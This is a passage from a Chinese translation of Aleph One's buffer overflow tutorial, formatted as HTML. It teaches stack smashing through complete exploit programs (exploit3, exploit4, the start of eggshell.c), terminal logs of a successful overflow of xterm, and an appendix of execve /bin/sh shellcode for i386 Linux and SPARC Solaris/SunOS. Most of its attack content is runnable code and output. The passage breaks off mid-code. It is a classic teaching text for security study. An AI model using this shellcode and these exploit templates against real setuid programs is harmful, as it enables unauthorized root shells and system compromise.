bsize&nbsp; = atoi(argv[1]);<BR>&nbsp; if (argc &gt; 2) offset = atoi(argv[2]);<BR><BR>&nbsp; if (!(buff = malloc(bsize))) {<BR>&nbsp;&nbsp;&nbsp; printf("Can't allocate memory.\n");<BR>&nbsp;&nbsp;&nbsp; exit(0);<BR>&nbsp; }<BR><BR>&nbsp; addr = get_sp() - offset;<BR>&nbsp; printf("Using address: 0x%x\n", addr);<BR><BR>&nbsp; ptr = buff;<BR>&nbsp; addr_ptr = (long *) ptr;<BR>&nbsp; for (i = 0; i &lt; bsize; i+=4)<BR>&nbsp;&nbsp;&nbsp; *(addr_ptr++) = addr;<BR><BR>&nbsp; for (i = 0; i &lt; bsize/2; i++)<BR>&nbsp;&nbsp;&nbsp; buff[i] = NOP;<BR><BR>&nbsp; ptr = buff + ((bsize/2) - (strlen(shellcode)/2));<BR>&nbsp; for (i = 0; i &lt; strlen(shellcode); i++)<BR>&nbsp;&nbsp;&nbsp; *(ptr++) = shellcode[i];<BR><BR>&nbsp; buff[bsize - 1] = '\0';<BR><BR>&nbsp; memcpy(buff,"EGG=",4);<BR>&nbsp; putenv(buff);<BR>&nbsp; system("/bin/bash");<BR>}<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 我们所使用的缓冲区大小最好比要使其溢出的缓冲区大100字节左右. 我们在要使其<BR>溢出的缓冲区尾部放置shellcode, 为NOP指令留下足够的空间, 仍然使用我们推测的地址<BR>来覆盖返回地址. 这里我们要使其溢出的缓冲区大小是512字节, 所以我们使用612字节.<BR>现在使用新的破解程序来使我们的测试程序溢出:<BR><BR>------------------------------------------------------------------------------<BR>[aleph1]$ ./exploit3 612<BR>Using address: 0xbffffdb4<BR>[aleph1]$ ./vulnerable $EGG<BR>$<BR>------------------------------------------------------------------------------<BR> <BR>&nbsp;&nbsp;&nbsp; 哇!一击中的!这个改进成千倍地提高了我们的命中率. 下面在真实的环境中尝试一<BR>下缓冲区溢出. 在Xt库上运用我们所讲述的方法. 在例子中, 我们使用xterm(实际上所有<BR>连接Xt库的程序都有漏洞). 计算机上要运行X Server并且允许本地的连接. 还要相应设<BR>置DISPLAY变量.<BR><BR><BR>------------------------------------------------------------------------------<BR>[aleph1]$ export DISPLAY=:0.0<BR>[aleph1]$ ./exploit3 1124<BR>Using address: 0xbffffdb4<BR>[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG<BR>Warning: Color name "隵1?F<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; °<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 骎<BR><BR>?へ@よ?in/shいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいい<BR>いいいいいいいいいいいいいいいいいいいいいいいいい¤<BR><BR><BR><BR>(此处截短多行输出)<BR><BR>いいいいいいいいいいい?いいいい<BR>^C<BR>[aleph1]$ exit<BR>[aleph1]$ ./exploit3 2148 100<BR>Using address: 0xbffffd48<BR>[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG<BR>Warning: Color name "隵1?F<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; °<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 骎<BR><BR>?へ@よ?in/sh??????????????????????????????????<BR>?????????????????????????¤<BR><BR><BR><BR>(此处截短多行输出)<BR><BR>縃????????????arning: some arguments in previous message were lost<BR>Illegal instruction<BR>[aleph1]$ exit<BR>.<BR>.<BR>.<BR>[aleph1]$ ./exploit4 2148 600<BR>Using address: 0xbffffb54<BR>[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG<BR>Warning: Color name "隵1?F<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; °<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 骎<BR><BR>?へ@よ?in/sh鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗<BR>鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗?<BR><BR><BR><BR>(此处截短多行输出)<BR><BR>縏鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸗鸚arning: some arguments in previous message were lost<BR>bash$<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp; 尤里卡! 仅仅几次尝试我们就成功了!如果xterm是带suid root安装的, 我们就已经<BR>得到了一个root shell了. <BR><BR>&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 小缓冲区的溢出<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~~~~~~~~~~~~~~~~<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; 有时候想使其溢出的缓冲区太小了, 以至于shellcode都放不进去, 这样返回地址就<BR>会被指令所覆盖, 而不是我们所推测的地址, 或者shellcode是放进去了, 但是没法填充<BR>足够多的NOP指令, 这样推测地址的成功率就很低了. 要从这样的程序(小缓冲区)里得到<BR>一个shell, 我们必须得想其他办法. 下面介绍的这种方法只在能够访问程序的环境变量<BR>时有效.<BR><BR>&nbsp;&nbsp;&nbsp; 我们所做的就是把shellcode放到环境变量中去, 然后用这个变量在内存中的地址来<BR>使缓冲区溢出. 这种方法同时也提高了破解工作的成功率, 因为保存shellcode的环境变<BR>量想要多大就有多大.<BR><BR>&nbsp;&nbsp;&nbsp; 当程序开始时, 环境变量存储在堆栈的顶部, 任何使用setenv()的修改动作会在其他<BR>地方重新分配空间. 开始时的堆栈如下所示:<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;strings&gt;&lt;argv pointers&gt;NULL&lt;envp pointers&gt;NULL&lt;argc&gt;&lt;argv&gt;&lt;envp&gt;<BR><BR>&nbsp;&nbsp;&nbsp; 我们新的程序会使用一个额外的变量, 变量的大小能够容纳shellcode和NOP指令,<BR>新的破解程序如下所示:<BR><BR>exploit4.c<BR>------------------------------------------------------------------------------<BR>#include &lt;stdlib.h&gt;<BR><BR>#define DEFAULT_OFFSET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0<BR>#define DEFAULT_BUFFER_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 512<BR>#define DEFAULT_EGG_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2048<BR>#define NOP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x90<BR><BR>char shellcode[] =<BR>&nbsp; "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<BR>&nbsp; "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<BR>&nbsp; "\x80\xe8\xdc\xff\xff\xff/bin/sh";<BR><BR>unsigned long get_esp(void) {<BR>&nbsp;&nbsp; __asm__("movl %esp,%eax");<BR>}<BR><BR>void main(int argc, char *argv[]) {<BR>&nbsp; char *buff, *ptr, *egg;<BR>&nbsp; long *addr_ptr, addr;<BR>&nbsp; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;<BR>&nbsp; int i, eggsize=DEFAULT_EGG_SIZE;<BR><BR>&nbsp; if (argc &gt; 1) bsize&nbsp;&nbsp; = atoi(argv[1]);<BR>&nbsp; if (argc &gt; 2) offset&nbsp; = atoi(argv[2]);<BR>&nbsp; if (argc &gt; 3) eggsize = atoi(argv[3]);<BR><BR><BR>&nbsp; if (!(buff = malloc(bsize))) {<BR>&nbsp;&nbsp;&nbsp; printf("Can't allocate memory.\n");<BR>&nbsp;&nbsp;&nbsp; exit(0);<BR>&nbsp; }<BR>&nbsp; if (!(egg = malloc(eggsize))) {<BR>&nbsp;&nbsp;&nbsp; printf("Can't allocate memory.\n");<BR>&nbsp;&nbsp;&nbsp; exit(0);<BR>&nbsp; }<BR><BR>&nbsp; addr = get_esp() - offset;<BR>&nbsp; printf("Using address: 0x%x\n", addr);<BR><BR>&nbsp; ptr = buff;<BR>&nbsp; addr_ptr = (long *) ptr;<BR>&nbsp; for (i = 0; i &lt; bsize; i+=4)<BR>&nbsp;&nbsp;&nbsp; *(addr_ptr++) = addr;<BR><BR>&nbsp; ptr = egg;<BR>&nbsp; for (i = 0; i &lt; eggsize - strlen(shellcode) - 1; i++)<BR>&nbsp;&nbsp;&nbsp; *(ptr++) = NOP;<BR><BR>&nbsp; for (i = 0; i &lt; strlen(shellcode); i++)<BR>&nbsp;&nbsp;&nbsp; *(ptr++) = shellcode[i];<BR><BR>&nbsp; buff[bsize - 1] = '\0';<BR>&nbsp; egg[eggsize - 1] = '\0';<BR><BR>&nbsp; memcpy(egg,"EGG=",4);<BR>&nbsp; putenv(egg);<BR>&nbsp; memcpy(buff,"RET=",4);<BR>&nbsp; putenv(buff);<BR>&nbsp; system("/bin/bash");<BR>}<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 用这个新的破解程序来试试我们的漏洞测试程序:<BR>&nbsp;&nbsp;&nbsp; <BR>------------------------------------------------------------------------------<BR>[aleph1]$ ./exploit4 768<BR>Using address: 0xbffffdb0<BR>[aleph1]$ ./vulnerable $RET<BR>$<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 成功了, 再试试xterm:<BR>&nbsp;&nbsp;&nbsp; <BR>------------------------------------------------------------------------------<BR>[aleph1]$ export DISPLAY=:0.0<BR>[aleph1]$ ./exploit4 2148<BR>Using address: 0xbffffdb0<BR>[aleph1]$ /usr/X11R6/bin/xterm -fg $RET<BR>Warning: Color name<BR>"挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨<BR>挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨<BR><BR><BR>(此处截短多行输出)<BR><BR>挨挨挨<BR>Warning: some arguments in previous message were lost<BR>$<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 一次成功! 它显著提高了我们的成功率. 依赖于破解程序和被破解程序比较环境数据<BR>的多少, 我们推测的地址可能高也可能低于真值. 正和负的偏移量都可以试一试.<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 寻找缓冲区溢出漏洞<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~~~~~~~~~~~~~~~~~~~~~<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; 如前所述, 缓冲区溢出是向一个缓冲区填充超过其处理能力的信息造成的结果. 由于C<BR>语言没有任何内置的边界检查, 写入一个字符数组时, 如果超越了数组的结尾就会造成溢<BR>出. 标准C语言库提供了一些没有边界检查的字符串复制或添加函数. 包括strcat(), <BR>strcpy(), sprintf(), and vsprintf(). 这些函数对一个null结尾的字符串进行操作, 并<BR>不检查溢出情况. gets()函数从标准输入中读取一行到缓冲区中, 直到换行或EOF. 它也不<BR>检查缓冲区溢出. scanf()函数族在匹配一系列非空格字符(%s), 或从指定集合(%[])中匹<BR>配非空系列字符时, 使用字符指针指向数组, 并且没有定义最大字段宽度这个可选项, 就<BR>可能出现问题. 如果这些函数的目标地址是一个固定大小的缓冲区, 函数的另外参数是由<BR>用户以某种形式输入, 则很有可能利用缓冲区溢出来破解它.<BR><BR>&nbsp;&nbsp;&nbsp; 另一种常见的编程结构是使用while循环从标准输入或某个文件中一次读入一个字符到<BR>缓冲区中, 直到行尾或文件结尾, 或者碰到别的什么终止符. 这种结构通常使用getc(), <BR>fgetc(), 或getchar()函数中的某一个. 如果在while循环中没有明确的溢出检查, 这种程<BR>序就很容易被破解.<BR><BR>&nbsp;&nbsp;&nbsp; 由此可见, grep(1)是一个很好的工具命令(帮助你找到程序中可能有的漏洞). 自由操<BR>作系统及其工具的源码是可读的. 当你意识到其实很多商业操作系统工具都和自由软件有<BR>着相同的源码时, 剩下的事情就简单了!&nbsp; :-)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 附录 A - 不同操作系统/体系结构的shellcode&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ <BR><BR>i386/Linux<BR>------------------------------------------------------------------------------<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp; 0x1f<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; popl&nbsp;&nbsp; %esi<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,0x8(%esi)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xorl&nbsp;&nbsp; %eax,%eax<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; %eax,0x7(%esi)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %eax,0xc(%esi)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; $0xb,%al<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,%ebx<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0x8(%esi),%ecx<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0xc(%esi),%edx<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xorl&nbsp;&nbsp; %ebx,%ebx<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %ebx,%eax<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %eax<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; -0x24<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .string \"/bin/sh\"<BR>------------------------------------------------------------------------------<BR><BR>SPARC/Solaris<BR>------------------------------------------------------------------------------<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sethi&nbsp;&nbsp; 0xbd89a, %l6<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; or&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %l6, 0x16e, %l6<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sethi&nbsp;&nbsp; 0xbdcda, %l7<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and&nbsp;&nbsp;&nbsp;&nbsp; %sp, %sp, %o0<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add&nbsp;&nbsp;&nbsp;&nbsp; %sp, 8, %o1<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp;&nbsp; %o2, %o2, %o2<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add&nbsp;&nbsp;&nbsp;&nbsp; %sp, 16, %sp<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; std&nbsp;&nbsp;&nbsp;&nbsp; %l6, [%sp - 16]<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; st&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %sp, [%sp - 8]<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; st&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %g0, [%sp - 4]<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; 0x3b, %g1<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ta&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 8<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp;&nbsp; %o7, %o7, %o0<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; 1, %g1<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ta&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 8<BR>------------------------------------------------------------------------------<BR><BR>SPARC/SunOS<BR>------------------------------------------------------------------------------<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sethi&nbsp;&nbsp; 0xbd89a, %l6<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; or&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %l6, 0x16e, %l6<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sethi&nbsp;&nbsp; 0xbdcda, %l7<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and&nbsp;&nbsp;&nbsp;&nbsp; %sp, %sp, %o0<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add&nbsp;&nbsp;&nbsp;&nbsp; %sp, 8, %o1<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp;&nbsp; %o2, %o2, %o2<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add&nbsp;&nbsp;&nbsp;&nbsp; %sp, 16, %sp<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; std&nbsp;&nbsp;&nbsp;&nbsp; %l6, [%sp - 16]<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; st&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %sp, [%sp - 8]<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; st&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %g0, [%sp - 4]<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; 0x3b, %g1<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; -0x1, %l5<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ta&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %l5 + 1<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp;&nbsp; %o7, %o7, %o0<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; 1, %g1<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ta&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %l5 + 1<BR>------------------------------------------------------------------------------<BR>&nbsp;&nbsp; <BR>&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 附录 B - 通用缓冲区溢出程序&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR><BR>shellcode.h<BR>------------------------------------------------------------------------------<BR>#if defined(__i386__) &amp;&amp; defined(__linux__)<BR><BR>#define NOP_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1<BR>char nop[] = "\x90";<BR>char shellcode[] =<BR>&nbsp; "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<BR>&nbsp; "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<BR>&nbsp; "\x80\xe8\xdc\xff\xff\xff/bin/sh";<BR><BR>unsigned long get_sp(void) {<BR>&nbsp;&nbsp; __asm__("movl %esp,%eax");<BR>}<BR><BR>#elif defined(__sparc__) &amp;&amp; defined(__sun__) &amp;&amp; defined(__svr4__)<BR><BR>#define NOP_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4<BR>char nop[]="\xac\x15\xa1\x6e";<BR>char shellcode[] =<BR>&nbsp; "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"<BR>&nbsp; "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"<BR>&nbsp; "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08"<BR>&nbsp; "\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08";<BR><BR>unsigned long get_sp(void) {<BR>&nbsp; __asm__("or %sp, %sp, %i0");<BR>}<BR><BR>#elif defined(__sparc__) &amp;&amp; defined(__sun__)<BR><BR>#define NOP_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4<BR>char nop[]="\xac\x15\xa1\x6e";<BR>char shellcode[] =<BR>&nbsp; "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"<BR>&nbsp; "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"<BR>&nbsp; "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\xaa\x10\x3f\xff"<BR>&nbsp; "\x91\xd5\x60\x01\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd5\x60\x01";<BR><BR>unsigned long get_sp(void) {<BR>&nbsp; __asm__("or %sp, %sp, %i0");<BR>}<BR><BR>#endif<BR>------------------------------------------------------------------------------<BR><BR>eggshell.c<BR>------------------------------------------------------------------------------<BR>/*<BR> * eggshell v1.0<BR> *<BR> * Aleph One / aleph1@underground.org<BR> */<BR>#include &lt;stdlib.h&gt;<BR>#include &lt;stdio.h&gt;<BR>#include "shellcode.h"<BR><BR>#define DEFAULT_OFFSET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0<BR>#define DEFAULT_BUFFER_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 512<BR>#define DEFAULT_EGG_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2048<BR><BR>void usage(void);<BR><BR>void main(int argc, char *argv[]) {<BR>&nbsp; char *ptr, *bof, *egg;<BR>&nbsp; long *addr_ptr, addr;<BR>&nbsp; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;<BR>&nbsp; int i, n, m, 